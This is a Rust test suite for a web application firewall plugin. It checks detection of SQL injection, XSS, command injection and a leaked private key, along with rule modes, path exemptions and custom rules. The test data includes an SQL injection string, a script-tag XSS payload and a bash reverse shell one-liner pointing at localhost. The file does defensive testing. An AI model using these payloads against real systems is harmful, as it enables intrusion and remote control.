use ferrum_edge::plugins::waf::Waf;
use ferrum_edge::plugins::{Plugin, PluginResult, RequestContext};
use serde_json::json;
use std::collections::HashMap;

fn ctx(method: &str, path: &str) -> RequestContext {
    RequestContext::new("203.0.113.10".into(), method.into(), path.into())
}

#[tokio::test]
async fn default_waf_monitors_sqli_query_without_blocking() {
    let plugin = Waf::new(&json!({})).unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%27%20OR%201%3D1".into());

    let result = plugin.on_request_received(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-SQLI-002"))
    );
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("monitored")
    );
}

#[tokio::test]
async fn rule_mode_can_enforce_default_rule() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-XSS-001": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/search");
    ctx.set_raw_query_string("q=%3Cscript%3Ealert(1)%3C/script%3E".into());

    let result = plugin.on_request_received(&mut ctx).await;

    match result {
        PluginResult::Reject {
            status_code, body, ..
        } => {
            assert_eq!(status_code, 403);
            assert_eq!(body, r#"{"error":"Forbidden"}"#);
        }
        other => panic!("expected reject, got {other:?}"),
    }
    assert_eq!(
        ctx.metadata.get("waf.action").map(String::as_str),
        Some("blocked")
    );
    assert_eq!(
        ctx.metadata
            .get("waf.first_blocking_rule")
            .map(String::as_str),
        Some("FE-XSS-001")
    );
}

#[tokio::test]
async fn path_exemption_short_circuits_and_writes_no_waf_metadata() {
    let plugin = Waf::new(&json!({
        "global_exemptions": { "paths": ["/health*"] },
        "rule_modes": { "FE-SQLI-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/healthz");
    ctx.set_raw_query_string("q=%27%20OR%201%3D1".into());

    let result = plugin.on_request_received(&mut ctx).await;

    assert!(matches!(result, PluginResult::Continue));
    assert!(!ctx.metadata.keys().any(|key| key.starts_with("waf.")));
}

#[tokio::test]
async fn request_body_scan_uses_context_aware_final_body_hook() {
    let plugin = Waf::new(&json!({
        "rule_modes": { "FE-CMD-002": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/submit");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    assert!(plugin.requires_request_body_buffering());
    assert!(plugin.should_buffer_request_body(&ctx));

    let headers = ctx.headers.clone();
    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"cmd":"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}"#,
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-CMD-002"))
    );
}

#[tokio::test]
async fn custom_body_json_path_rule_scans_only_selected_value() {
    let plugin = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-JSON-1",
            "name": "message content marker",
            "category": "custom",
            "severity": "high",
            "target": { "type": "body_json_path", "path": "messages.0.content" },
            "match_kind": "contains",
            "pattern": "needle",
            "action": "enforce"
        }]
    }))
    .unwrap();
    let mut ctx = ctx("POST", "/chat");
    ctx.headers
        .insert("content-type".into(), "application/json".into());
    let headers = ctx.headers.clone();

    let result = plugin
        .on_final_request_body_with_context(
            &mut ctx,
            &headers,
            br#"{"messages":[{"content":"needle here"}],"other":"clean"}"#,
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert_eq!(
        ctx.metadata.get("waf.rule_hits").map(String::as_str),
        Some("CUSTOM-JSON-1")
    );
}

#[tokio::test]
async fn response_body_inspection_is_off_by_default() {
    let plugin = Waf::new(&json!({})).unwrap();
    let ctx = ctx("GET", "/");
    assert!(!plugin.requires_response_body_buffering());
    assert!(!plugin.should_buffer_response_body(&ctx));
}

#[tokio::test]
async fn response_body_scan_detects_sensitive_data_when_enabled() {
    let plugin = Waf::new(&json!({
        "response_inspection": true,
        "response_body_inspection": true,
        "rule_modes": { "FE-DATA-LEAK-006": "enforce" }
    }))
    .unwrap();
    let mut ctx = ctx("GET", "/debug");
    let headers = HashMap::from([("content-type".to_string(), "text/plain".to_string())]);

    let result = plugin
        .on_final_response_body(
            &mut ctx,
            200,
            &headers,
            b"-----BEGIN PRIVATE KEY-----\nsecret\n-----END PRIVATE KEY-----",
        )
        .await;

    assert!(matches!(result, PluginResult::Reject { .. }));
    assert!(
        ctx.metadata
            .get("waf.rule_hits")
            .is_some_and(|hits| hits.contains("FE-DATA-LEAK-006"))
    );
}

#[test]
fn invalid_custom_regex_is_rejected() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-1",
            "name": "bad",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "regex",
            "pattern": "("
        }]
    }))
    .unwrap_err();

    assert!(err.contains("RegexSet"));
}

#[test]
fn luhn_match_kind_requires_body_target() {
    let err = Waf::new(&json!({
        "include_default_rules": false,
        "custom_rules": [{
            "id": "CUSTOM-LUHN-1",
            "name": "bad target",
            "category": "custom",
            "severity": "high",
            "target": "query_values",
            "match_kind": "luhn"
        }]
    }))
    .unwrap_err();

    assert!(err.contains("match_kind luhn is only supported for body targets"));
}
